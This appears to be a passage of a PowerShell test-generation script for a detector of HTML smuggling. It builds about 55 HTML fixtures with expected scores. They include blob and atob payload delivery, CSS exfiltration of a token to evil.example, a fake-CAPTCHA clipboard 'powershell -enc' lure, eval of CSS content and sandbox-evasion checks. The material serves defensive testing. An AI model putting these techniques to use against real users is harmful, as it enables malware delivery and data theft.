var blob = new Blob([decoded], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);
window.__smuggle_url = url;
</script>
</body></html>
"@

# 02
Add-TestFile -List ([ref]$testFiles) -Name 'test02_split_payload_pe_fixed.html' -ExpectedScore '10-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'split_payload,atob,blob,createObjectURL,dec_pe' -Description 'Korrigierter Split Payload mit mindestens sechs Fragmenten' -Category 'JS_SMUGGLING' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var p1 = "$($PE_BASE64.Substring(0,120))";
var p2 = "$($PE_BASE64.Substring(120,120))";
var p3 = "$($PE_BASE64.Substring(240,120))";
var p4 = "$($PE_BASE64.Substring(360,120))";
var p5 = "$($PE_BASE64.Substring(480,80))";
var p6 = "$($PE_BASE64.Substring(560))";
var payload = "";
payload += p1;
payload += p2;
payload += p3;
payload += p4;
payload += p5;
payload += p6;
var decoded = atob(payload);
var blob = new Blob([decoded], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);
window.__split_url = url;
</script>
</body></html>
"@

# 03
Add-TestFile -List ([ref]$testFiles) -Name 'test03_array_join_pe.html' -ExpectedScore '10-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'atob,blob,createObjectURL,b64_joined_parts,dec_pe' -Description 'Array.join Konstruktion mit PE Payload' -Category 'JS_SMUGGLING' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var parts = [
  "$($PE_BASE64.Substring(0,200))",
  "$($PE_BASE64.Substring(200,200))",
  "$($PE_BASE64.Substring(400))"
];
var payload = parts.join('');
var decoded = atob(payload);
var blob = new Blob([decoded], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);
window.__joined_url = url;
</script>
</body></html>
"@

# 04
Add-TestFile -List ([ref]$testFiles) -Name 'test04_obfuscated_pe.html' -ExpectedScore '10-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'atob_obfuscated or obfus_api,blob,createObjectURL,dec_pe' -Description 'Obfuskierter Zugriff ueber Array Indizes und Konstruktoren' -Category 'OBFUSCATION' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var _0x4a8b = ['atob', 'Blob', 'createObjectURL', 'href'];
var _0x2c9d = "$PE_BASE64";
var _0x1f3e = window[_0x4a8b[0]](_0x2c9d);
var _0x5b2a = new window[_0x4a8b[1]]([_0x1f3e], {type:'application/octet-stream'});
var _0x7d4c = URL[_0x4a8b[2]](_0x5b2a);
window.location[_0x4a8b[3]] = _0x7d4c;
</script>
</body></html>
"@

# 05
Add-TestFile -List ([ref]$testFiles) -Name 'test05_wasm_smuggling.html' -ExpectedScore '6-10' -ExpectedDetection 'YES' -ExpectedCoreReasons 'fetch,webassembly or wasm_fetch_stage' -Description 'WASM Modul ueber fetch und WebAssembly.instantiate' -Category 'WASM_STAGING' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var wasmData = "$WASM_BASE64";
var decoded = atob(wasmData);
var blob = new Blob([decoded], {type: 'application/wasm'});
var url = URL.createObjectURL(blob);
fetch(url).then(function(r) { return r.arrayBuffer(); }).then(function(bytes) {
  return WebAssembly.instantiate(bytes);
});
</script>
</body></html>
"@

# 06
Add-TestFile -List ([ref]$testFiles) -Name 'test06_uint8array_pe_large.html' -ExpectedScore '10-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'uint8array_payload,pe_uint8array' -Description 'Korrigierter Uint8Array Test mit mehr als 1024 Bytewerten' -Category 'UINT8ARRAY' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var peBytes = new Uint8Array([$UINT8ARRAY_LITERAL]);
var blob = new Blob([peBytes], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);
window.__uint8_url = url;
</script>
</body></html>
"@

# 07
Add-TestFile -List ([ref]$testFiles) -Name 'test07_delayed_execution_pe.html' -ExpectedScore '10-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'delayed_execution,timeout_b64_smuggling or timeout_b64_decode,dec_pe' -Description 'Verzoegertes Smuggling ueber setTimeout' -Category 'JS_SMUGGLING' -Content @"
<!DOCTYPE html>
<html><body>
<script>
setTimeout(function() {
  var payload = "$PE_BASE64";
  var decoded = atob(payload);
  var blob = new Blob([decoded], {type: 'application/octet-stream'});
  var url = URL.createObjectURL(blob);
  window.__delayed_url = url;
}, 150);
</script>
</body></html>
"@

# 08
Add-TestFile -List ([ref]$testFiles) -Name 'test08_webworker_pe.html' -ExpectedScore '10-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'webworker,atob,blob,createObjectURL,dec_pe' -Description 'Web Worker verarbeitet den Base64 Payload' -Category 'WEBWORKER' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var workerCode = "self.onmessage = function(e){ var decoded = atob(e.data.payload); self.postMessage(decoded); }";
var workerBlob = new Blob([workerCode], {type: 'application/javascript'});
var workerUrl = URL.createObjectURL(workerBlob);
var worker = new Worker(workerUrl);
worker.onmessage = function(e) {
  var blob = new Blob([e.data], {type: 'application/octet-stream'});
  var url = URL.createObjectURL(blob);
  window.__worker_url = url;
};
worker.postMessage({payload: "$PE_BASE64"});
</script>
</body></html>
"@

# 09
Add-TestFile -List ([ref]$testFiles) -Name 'test09_fetch_api_pe.html' -ExpectedScore '6-10' -ExpectedDetection 'YES' -ExpectedCoreReasons 'fetch,data_uri or blob,createObjectURL or dec_pe' -Description 'Fetch API plus Data URI Transport' -Category 'FETCH' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var payload = "$PE_BASE64";
fetch('data:application/octet-stream;base64,' + payload)
  .then(function(r) { return r.blob(); })
  .then(function(b) {
    var url = URL.createObjectURL(b);
    window.__fetch_url = url;
  });
</script>
</body></html>
"@

# 10
Add-TestFile -List ([ref]$testFiles) -Name 'test10_appinstaller_schema.html' -ExpectedScore '4-8' -ExpectedDetection 'YES' -ExpectedCoreReasons 'ms_appinstaller_uri or ms_appinstaller_word' -Description 'AppInstaller Schema und XML Kontext' -Category 'APPINSTALLER' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var schema = "ms-appinstaller:?source=https://example.com/malware.appinstaller";
var xml = '<?xml version="1.0"?><AppInstaller Uri="https://example.com/app.msix" Version="1.0.0.0"><MainPackage Name="App" Publisher="CN=Test" Version="1.0.0.0" Uri="https://example.com/app.msix"/></AppInstaller>';
var blob = new Blob([xml], {type: 'application/xml'});
var url = URL.createObjectURL(blob);
console.log(schema, url);
</script>
</body></html>
"@

# 11
Add-TestFile -List ([ref]$testFiles) -Name 'test11_pdf_javascript_payload.html' -ExpectedScore '4-8' -ExpectedDetection 'YES' -ExpectedCoreReasons 'dec_pdf,att_pdf_javascript' -Description 'PDF mit JavaScript Action im Decode Pfad' -Category 'PDF_ACTIVE' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var pdfData = "$PDF_JS_BASE64";
var decoded = atob(pdfData);
var blob = new Blob([decoded], {type: 'application/pdf'});
var url = URL.createObjectURL(blob);
window.__pdf_js = url;
</script>
</body></html>
"@

# 12
Add-TestFile -List ([ref]$testFiles) -Name 'test12_pdf_launch_payload.html' -ExpectedScore '6-10' -ExpectedDetection 'YES' -ExpectedCoreReasons 'dec_pdf,att_pdf_launch,att_pdf_embeddedfile' -Description 'PDF mit Launch und EmbeddedFile im Decode Pfad' -Category 'PDF_ACTIVE' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var pdfData = "$PDF_LAUNCH_BASE64";
var decoded = atob(pdfData);
var blob = new Blob([decoded], {type: 'application/pdf'});
var url = URL.createObjectURL(blob);
window.__pdf_launch = url;
</script>
</body></html>
"@

# 13
Add-TestFile -List ([ref]$testFiles) -Name 'test13_svg_active_content.html' -ExpectedScore '10-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'att_svg_script,att_svg_event_handler,att_svg_foreignobject,att_svg_data_uri,att_svg_smuggling_context' -Description 'Aktives SVG in eingebetteter object data URI Form' -Category 'SVG_ACTIVE' -Content @"
<!DOCTYPE html>
<html><body>
<object data="data:image/svg+xml;base64,$SVG_BASE64" type="image/svg+xml"></object>
</body></html>
"@

# 14
Add-TestFile -List ([ref]$testFiles) -Name 'test14_chm_payload.html' -ExpectedScore '6-10' -ExpectedDetection 'YES' -ExpectedCoreReasons 'att_chm_attachment or CHM decode indicator' -Description 'CHM Payload ueber Base64 und Blob' -Category 'ATTACHMENT_VECTOR_DECODE' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var chmData = "$CHM_BASE64";
var decoded = atob(chmData);
var blob = new Blob([decoded], {type: 'application/vnd.ms-htmlhelp'});
var url = URL.createObjectURL(blob);
window.__chm_url = url;
</script>
</body></html>
"@

# 15
Add-TestFile -List ([ref]$testFiles) -Name 'test15_hta_payload.html' -ExpectedScore '10-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'att_hta_attachment or dec_script' -Description 'HTA Payload ueber Base64 und Blob' -Category 'ATTACHMENT_VECTOR_DECODE' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var htaData = "$HTA_BASE64";
var decoded = atob(htaData);
var blob = new Blob([decoded], {type: 'application/hta'});
var url = URL.createObjectURL(blob);
window.__hta_url = url;
</script>
</body></html>
"@

# 16
Add-TestFile -List ([ref]$testFiles) -Name 'test16_certificate_inline_pem.html' -ExpectedScore '2-5' -ExpectedDetection 'YES' -ExpectedCoreReasons 'cert_attachment_file or cert_base64_block' -Description 'Inline PEM Zertifikat ohne starken Smuggling Kontext' -Category 'CERT_SMUGGLING' -Content @"
<!DOCTYPE html>
<html><body>
<pre>
$CERT_PEM
</pre>
</body></html>
"@

# 17
Add-TestFile -List ([ref]$testFiles) -Name 'test17_certificate_pkcs7_inline.html' -ExpectedScore '2-5' -ExpectedDetection 'YES' -ExpectedCoreReasons 'cert_attachment_file or cert_base64_block' -Description 'Inline PKCS7 Block ohne starken Smuggling Kontext' -Category 'CERT_SMUGGLING' -Content @"
<!DOCTYPE html>
<html><body>
<pre>
$CERT_PKCS7
</pre>
</body></html>
"@

# 18
Add-TestFile -List ([ref]$testFiles) -Name 'test18_certificate_smuggling_context.html' -ExpectedScore '4-8' -ExpectedDetection 'YES' -ExpectedCoreReasons 'cert_inline_pem or cert_base64_block plus Smuggling Kontext' -Description 'Zertifikatsblock zusammen mit Smuggling Kontext' -Category 'CERT_SMUGGLING' -Content @"
<!DOCTYPE html>
<html><body>
<pre>
$CERT_PEM
</pre>
<script>
var payload = "$PE_BASE64";
var decoded = atob(payload);
var blob = new Blob([decoded], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);
console.log(url);
</script>
</body></html>
"@

# 19
Add-TestFile -List ([ref]$testFiles) -Name 'test19_css_code_execution.html' -ExpectedScore '4-8' -ExpectedDetection 'YES' -ExpectedCoreReasons 'css_before_after_content,css_hidden_code_string,css_function_bridge,css_code_execution' -Description 'CSS Inhalte werden spaeter als Code missbraucht' -Category 'CSS_CODE_EXEC' -Content @"
<!DOCTYPE html>
<html><head>
<style>
body::before {
  content: "atob('cGF5bG9hZA==')";
}
body::after {
  content: "eval(atob('dGVzdA=='))";
}
</style>
</head>
<body>
<script>
var style = getComputedStyle(document.body, '::before');
var content = style.content;
if (content && content.indexOf('atob') !== -1) {
  eval(content);
}
</script>
</body></html>
"@

# 20
Add-TestFile -List ([ref]$testFiles) -Name 'test20_css_computedstyle_exec.html' -ExpectedScore '4-8' -ExpectedDetection 'YES' -ExpectedCoreReasons 'css_computedstyle_exec,css_function_bridge' -Description 'getComputedStyle liest versteckten Inhalt aus' -Category 'CSS_CODE_EXEC' -Content @"
<!DOCTYPE html>
<html><head>
<style>
#test::before { content: "YWxlcnQoJ3h4eCcp"; }
</style>
</head>
<body>
<div id="test"></div>
<script>
var before = getComputedStyle(document.getElementById('test'), '::before').content;
var decoded = atob(before.replace(/['"]/g, ''));
eval(decoded);
</script>
</body></html>
"@

# 21
Add-TestFile -List ([ref]$testFiles) -Name 'test21_external_scripts_positive.html' -ExpectedScore '4-8' -ExpectedDetection 'YES' -ExpectedCoreReasons 'atob,external_scripts' -Description 'Externes Script im vorhandenen Smuggling Kontext' -Category 'EXTERNAL_SCRIPTS' -Content @"
<!DOCTYPE html>
<html><body>
<script src="https://evil.example/payload.js"></script>
<script>
var seed = atob("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=");
console.log(seed);
</script>
</body></html>
"@

# 22
Add-TestFile -List ([ref]$testFiles) -Name 'test22_css_exfil_attr.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'css_attr_exfil,css_exfiltration' -Description 'CSS attr Exfiltration ueber background url' -Category 'CSS_EXFIL' -Content @"
<!DOCTYPE html>
<html><head>
<style>
input[data-token] {
  background-image: url(https://evil.example/collect?d=attr(data-token));
}
</style>
</head>
<body>
<input data-token="secret-token-123456" />
</body></html>
"@

# 23
Add-TestFile -List ([ref]$testFiles) -Name 'test23_css_import_external.html' -ExpectedScore '0-3' -ExpectedDetection 'YES' -ExpectedCoreReasons 'css_import_external' -Description 'Externer CSS Import' -Category 'CSS_EXFIL' -Content @"
<!DOCTYPE html>
<html><head>
<style>
@import url("https://evil.example/a.css");
body { font-family: Arial; }
</style>
</head>
<body>css import test</body></html>
"@

# 24
Add-TestFile -List ([ref]$testFiles) -Name 'test24_geo_targeting_api.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'geo_targeting_api,geo_location_api' -Description 'Geo API und Geolocation in einem Script' -Category 'GEO_TARGETING' -Content @"
<!DOCTYPE html>
<html><body>
<script>
fetch('https://ipapi.co/json/');
navigator.geolocation.getCurrentPosition(function(pos) {
  console.log(pos.coords.latitude);
});
</script>
</body></html>
"@

# 25
Add-TestFile -List ([ref]$testFiles) -Name 'test25_timezone_targeting.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'timezone_targeting' -Description 'Timezone basierte Selektionslogik' -Category 'GEO_TARGETING' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
var off = new Date().getTimezoneOffset();
if (tz === 'Europe/Zurich' || off === -60) {
  console.log('target matched');
}
</script>
</body></html>
"@

# 26
Add-TestFile -List ([ref]$testFiles) -Name 'test26_evasion_webdriver.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'antisandbox_webdriver' -Description 'Antisandbox ueber navigator.webdriver' -Category 'EVASION' -Content @"
<!DOCTYPE html>
<html><body>
<script>
if (navigator.webdriver === true || ('webdriver' in navigator)) {
  console.log('sandbox detected');
}
</script>
</body></html>
"@

# 27
Add-TestFile -List ([ref]$testFiles) -Name 'test27_evasion_hardware_check.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'hardware_check_evasion' -Description 'Hardware Checks fuer kleine oder virtuelle Systeme' -Category 'EVASION' -Content @"
<!DOCTYPE html>
<html><body>
<script>
if (navigator.hardwareConcurrency <= 2 || navigator.deviceMemory <= 4 || screen.width <= 800) {
  console.log('low resource environment');
}
</script>
</body></html>
"@

# 28
Add-TestFile -List ([ref]$testFiles) -Name 'test28_persistence_localstorage.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'localstorage_persistence' -Description 'LocalStorage Speicherung und Wiederverwendung' -Category 'PERSISTENCE' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var current = localStorage.getItem('payload');
if (!current) {
  localStorage.setItem('payload', 'stage-1');
}
</script>
</body></html>
"@

# 29
Add-TestFile -List ([ref]$testFiles) -Name 'test29_persistence_sessionstorage.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'sessionstorage_persistence' -Description 'SessionStorage Persistenz' -Category 'PERSISTENCE' -Content @"
<!DOCTYPE html>
<html><body>
<script>
sessionStorage.setItem('stage', '2');
console.log(sessionStorage.getItem('stage'));
</script>
</body></html>
"@

# 30
Add-TestFile -List ([ref]$testFiles) -Name 'test30_domain_rotation.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'domain_rotation' -Description 'Drei Domains und Redirect Logik' -Category 'DOMAIN_ROTATION' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var urls = [
  'https://a.example/path',
  'https://b.example/path',
  'https://c.example/path'
];
window.location = urls[2];
</script>
</body></html>
"@

# 31
Add-TestFile -List ([ref]$testFiles) -Name 'test31_computed_redirect.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'computed_redirect' -Description 'Redirect Ziel wird dynamisch zusammengesetzt' -Category 'DOMAIN_ROTATION' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var a = 'https://';
var b = 'evil.example/';
var c = 'stage';
window.location = a + b + c;
</script>
</body></html>
"@

# 32
Add-TestFile -List ([ref]$testFiles) -Name 'test32_clickfix_run_dialog.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'run_dialog_lure,powershell_lure or clickfix_lure' -Description 'Run Dialog und PowerShell Lure' -Category 'CLICKFIX' -Content @"
<!DOCTYPE html>
<html><body>
<div>Press Windows+R and open the Run Dialog.</div>
<div>Then paste this PowerShell command.</div>
<script>
console.log('windows+r powershell run dialog');
</script>
</body></html>
"@

# 33
Add-TestFile -List ([ref]$testFiles) -Name 'test33_fake_captcha_clipboard.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'fake_captcha_lure,clipboard_exec_lure,clickfix_lure' -Description 'Fake CAPTCHA mit Clipboard und Exec Kontext' -Category 'CLICKFIX' -Content @"
<!DOCTYPE html>
<html><body>
<h2>I am not a robot</h2>
<p>Copy this command from the clipboard and run PowerShell.</p>
<script>
navigator.clipboard.writeText('powershell -enc AAAA');
</script>
</body></html>
"@

# 34
Add-TestFile -List ([ref]$testFiles) -Name 'test34_push_abuse.html' -ExpectedScore '0-3' -ExpectedDetection 'YES' -ExpectedCoreReasons 'push_permission_request,push_serviceworker_combo,push_notification_flow' -Description 'Notification Permission plus Service Worker und PushManager' -Category 'PUSH_ABUSE' -Content @"
<!DOCTYPE html>
<html><body>
<script>
Notification.requestPermission().then(function() {
  navigator.serviceWorker.register('/sw.js').then(function(reg) {
    return reg.pushManager.subscribe({userVisibleOnly: true});
  });
});
</script>
</body></html>
"@

# 35
Add-TestFile -List ([ref]$testFiles) -Name 'test35_blockchain_staging.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'web3_api_usage,ethers_contract_payload,blockchain_remote_stage or blockchain_staged_payload' -Description 'Web3 oder Ethers basierte Staging Logik' -Category 'BLOCKCHAIN_STAGING' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var ethers = {};
ethers.Contract = function(address, abi, provider) { return { getPayload: function() { return 'payload'; } }; };
var provider = { call: function(o) { return Promise.resolve('data'); } };
var contract = new ethers.Contract('0x1234', [], provider);
provider.call({to: '0x1234', data: '0xdeadbeef'});
eval(atob('Y29uc29sZS5sb2coJ2Jsb2NrY2hhaW4nKQ=='));
</script>
</body></html>
"@

# 36
Add-TestFile -List ([ref]$testFiles) -Name 'test36_legitimate_negative.html' -ExpectedScore '0-1' -ExpectedDetection 'NO' -ExpectedCoreReasons 'none' -Description 'Legitime einfache Seite ohne verdaechtige APIs' -Category 'NEGATIVE' -Content @"
<!DOCTYPE html>
<html>
<head><title>Legitimate Site</title></head>
<body>
<h1>Welcome</h1>
<p>This is a normal page.</p>
<a href="https://example.org/help">Help</a>
</body>
</html>
"@

# 37
Add-TestFile -List ([ref]$testFiles) -Name 'test37_safe_external_negative.html' -ExpectedScore '0-2' -ExpectedDetection 'NO' -ExpectedCoreReasons 'none' -Description 'Externe Scripts ohne Smuggling Kontext' -Category 'NEGATIVE' -Content @"
<!DOCTYPE html>
<html><body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js"></script>
<script>
console.log('normal script usage');
</script>
</body></html>
"@

# 38
Add-TestFile -List ([ref]$testFiles) -Name 'test38_html_keyword_newsletter_like.html' -ExpectedScore '0-2' -ExpectedDetection 'LOW_OR_NONE' -ExpectedCoreReasons 'html_keyword newsletter heuristic only' -Description 'Nur HTML Keyword, kein echter Header Newsletter Test' -Category 'NEWSLETTER_HTML_ONLY' -Content @"
<!DOCTYPE html>
<html><body>
<p>View in browser</p>
<p>Weekly customer update</p>
</body></html>
"@

# 39
Add-TestFile -List ([ref]$testFiles) -Name 'test39_all_in_one_capped.html' -ExpectedScore '10-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'mehrere Klassen, intern gedeckelt' -Description 'Kombinierter Test fuer mehrere Module mit realistischer Cap Erwartung' -Category 'ALL_IN_ONE' -Content @"
<!DOCTYPE html>
<html><head>
<style>
body::before { content: "atob('$($PE_BASE64.Substring(0,120))')"; }
input[data-token] { background-image: url(https://evil.example/collect?d=attr(data-token)); }
</style>
</head>
<body>
<input data-token="secret-12345" />
<object data="data:image/svg+xml;base64,$SVG_BASE64" type="image/svg+xml"></object>
<script src="https://evil.example/stage.js"></script>
<script>
var parts = [
  "$($PE_BASE64.Substring(0,150))",
  "$($PE_BASE64.Substring(150,150))",
  "$($PE_BASE64.Substring(300,150))",
  "$($PE_BASE64.Substring(450))"
];
var payload = parts.join('');
setTimeout(function() {
  var decoded = atob(payload);
  var blob = new Blob([decoded], {type: 'application/octet-stream'});
  var url = URL.createObjectURL(blob);
  fetch(url).then(function(r) { return r.blob(); }).then(function(b) {
    var finalUrl = URL.createObjectURL(b);
    window.__all_url = finalUrl;
  });
}, 100);

if (navigator.webdriver === true) {
  console.log('webdriver');
}

Notification.requestPermission().then(function() {
  navigator.serviceWorker.register('/sw.js').then(function(reg) {
    return reg.pushManager.subscribe({userVisibleOnly: true});
  });
});
</script>
</body></html>
"@

# 40
Add-TestFile -List ([ref]$testFiles) -Name 'test40_svg_data_uri_pe_direct.html' -ExpectedScore '10-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'att_svg_data_uri,att_svg_script,att_svg_event_handler,dec_pe' -Description 'Direkter SVG Data URI Test fuer den eingebetteten SVG Extraktionspfad' -Category 'SVG_ACTIVE' -Content @"
<!DOCTYPE html>
<html><body>
<embed src="data:image/svg+xml;base64,$SVG_BASE64" type="image/svg+xml" />
</body></html>
"@

# 41
Add-TestFile -List ([ref]$testFiles) -Name 'test41_v46_script_prescan_magic_late.html' -ExpectedScore '10-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'script_prescan_payload,b64_magic_prefix,dec_pe' -Description 'v4.6: billiger Vorscan erkennt einen Magic-Prefix Payload auch in einem spaeten Script Block' -Category 'V46_SCRIPT_PRESCAN' -Content $PRESCAN_LATE_HTML

# 42
Add-TestFile -List ([ref]$testFiles) -Name 'test42_v46_script_prescan_budget.html' -ExpectedScore '10-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'script_prescan_payload,dec_pe' -ExpectedInfoReasons 'script_prescan_budget' -Description 'v4.6: mehr als 64 Inline Scripts provozieren kontrolliert das Prescan Budget, waehrend ein frueher PE Payload erkannt bleibt' -Category 'V46_BUDGET' -Content $PRESCAN_BUDGET_HTML

# 43
Add-TestFile -List ([ref]$testFiles) -Name 'test43_v46_uint8array_hex_pe.html' -ExpectedScore '10-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'uint8array_payload,pe_uint8array' -Description 'Hexadezimale Uint8Array Bytefolge mit PE Magic 0x4D,0x5A' -Category 'V46_UINT8ARRAY' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var peHex = new Uint8Array([$PE_HEX_ARRAY]);
var blob = new Blob([peHex], {type:'application/octet-stream'});
var url = URL.createObjectURL(blob);
window.__hex_pe = url;
</script>
</body></html>
"@

# 44
Add-TestFile -List ([ref]$testFiles) -Name 'test44_v46_nested_base64_pe.html' -ExpectedScore '10-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'nested_base64_payload,dec_pe' -Description 'Rekursiver Base64 Decode: aeussere Base64 Stufe enthaelt eine weitere PE Base64 Stufe' -Category 'V46_RECURSIVE_DECODE' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var outer = "$NESTED_PE_BASE64";
var stage1 = atob(outer);
var blob = new Blob([stage1], {type:'text/plain'});
var url = URL.createObjectURL(blob);
window.__nested = url;
</script>
</body></html>
"@

# 45
Add-TestFile -List ([ref]$testFiles) -Name 'test45_v46_gzip_magic_payload.html' -ExpectedScore '6-10' -ExpectedDetection 'YES' -ExpectedCoreReasons 'dec_compressed' -Description 'Dekodierte Payload mit GZIP Magic Header fuer die erweiterte Content Klassifikation' -Category 'V46_COMPRESSED' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var payload = "$GZIP_BASE64";
var decoded = atob(payload);
var blob = new Blob([decoded], {type:'application/octet-stream'});
URL.createObjectURL(blob);
</script>
</body></html>
"@

# 46
Add-TestFile -List ([ref]$testFiles) -Name 'test46_v46_zip_executable_member.html' -ExpectedScore '8-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'dec_zip,zip_executable_member' -Description 'Echtes ZIP Layout mit ausfuehrbarem Mitglied payload.exe' -Category 'V46_ZIP' -Content @"
<!DOCTYPE html><html><body><script>
var z="$ZIP_EXE_BASE64"; var d=atob(z); var b=new Blob([d],{type:'application/zip'}); URL.createObjectURL(b);
</script></body></html>
"@

# 47
Add-TestFile -List ([ref]$testFiles) -Name 'test47_v46_zip_script_member.html' -ExpectedScore '8-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'dec_zip,zip_script_member' -Description 'ZIP Central Directory enthaelt eine PowerShell Datei' -Category 'V46_ZIP' -Content @"
<!DOCTYPE html><html><body><script>
var z="$ZIP_SCRIPT_BASE64"; var d=atob(z); var b=new Blob([d],{type:'application/zip'}); URL.createObjectURL(b);
</script></body></html>
"@

# 48
Add-TestFile -List ([ref]$testFiles) -Name 'test48_v46_zip_double_extension.html' -ExpectedScore '8-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'dec_zip,zip_executable_member,zip_double_extension' -Description 'ZIP Mitglied invoice.pdf.exe prueft Cover Extension plus gefaehrliche finale Extension' -Category 'V46_ZIP' -Content @"
<!DOCTYPE html><html><body><script>
var z="$ZIP_DOUBLE_BASE64"; var d=atob(z); var b=new Blob([d],{type:'application/zip'}); URL.createObjectURL(b);
</script></body></html>
"@

# 49
Add-TestFile -List ([ref]$testFiles) -Name 'test49_v46_zip_path_traversal.html' -ExpectedScore '8-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'dec_zip,zip_script_member,zip_path_traversal' -Description 'ZIP Mitglied mit ../ Pfad prueft Path Traversal Klassifikation' -Category 'V46_ZIP' -Content @"
<!DOCTYPE html><html><body><script>
var z="$ZIP_TRAVERSAL_BASE64"; var d=atob(z); var b=new Blob([d],{type:'application/zip'}); URL.createObjectURL(b);
</script></body></html>
"@

# 50
Add-TestFile -List ([ref]$testFiles) -Name 'test50_v46_zip_nested_archive.html' -ExpectedScore '6-12' -ExpectedDetection 'YES' -ExpectedCoreReasons 'dec_zip,zip_nested_archive' -Description 'ZIP Mitglied inner.zip prueft Nested Archive Metadaten' -Category 'V46_ZIP' -Content @"
<!DOCTYPE html><html><body><script>
var z="$ZIP_NESTED_BASE64"; var d=atob(z); var b=new Blob([d],{type:'application/zip'}); URL.createObjectURL(b);
</script></body></html>
"@

# 51
Add-TestFile -List ([ref]$testFiles) -Name 'test51_v46_zip_high_ratio.html' -ExpectedScore '4-10' -ExpectedDetection 'YES' -ExpectedCoreReasons 'dec_zip' -ExpectedInfoReasons 'zip_high_compression_ratio' -Description 'ZIP Metadaten melden ueber 1 MiB unkomprimiert bei sehr kleiner komprimierter Groesse' -Category 'V46_ZIP_INFO' -Content @"
<!DOCTYPE html><html><body><script>
var z="$ZIP_HIGH_RATIO_BASE64"; var d=atob(z); var b=new Blob([d],{type:'application/zip'}); URL.createObjectURL(b);
</script></body></html>
"@

# 52
Add-TestFile -List ([ref]$testFiles) -Name 'test52_v46_zip_stored_pe.html' -ExpectedScore '10-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'dec_zip,zip_stored_payload,dec_pe' -Description 'Stored ZIP Mitglied enthaelt direkt einen PE Payload und wird begrenzt rekursiv analysiert' -Category 'V46_ZIP_STORED' -Content @"
<!DOCTYPE html><html><body><script>
var z="$ZIP_STORED_PE_BASE64"; var d=atob(z); var b=new Blob([d],{type:'application/zip'}); URL.createObjectURL(b);
</script></body></html>
"@

# 53
Add-TestFile -List ([ref]$testFiles) -Name 'test53_v46_zip_encrypted_flag.html' -ExpectedScore '6-12' -ExpectedDetection 'YES' -ExpectedCoreReasons 'dec_zip,zip_encrypted' -Description 'ZIP Central Directory mit General Purpose Encryption Flag' -Category 'V46_ZIP' -Content @"
<!DOCTYPE html><html><body><script>
var z="$ZIP_ENCRYPTED_BASE64"; var d=atob(z); var b=new Blob([d],{type:'application/zip'}); URL.createObjectURL(b);
</script></body></html>
"@

# 54
Add-TestFile -List ([ref]$testFiles) -Name 'test54_v46_zip_many_entries.html' -ExpectedScore '4-10' -ExpectedDetection 'YES' -ExpectedCoreReasons 'dec_zip' -ExpectedInfoReasons 'zip_many_entries' -Description 'ZIP mit 257 Eintraegen prueft das max_entries Limit und den Info Marker' -Category 'V46_ZIP_INFO' -Content @"
<!DOCTYPE html><html><body><script>
var z="$ZIP_MANY_BASE64"; var d=atob(z); var b=new Blob([d],{type:'application/zip'}); URL.createObjectURL(b);
</script></body></html>
"@

# 55
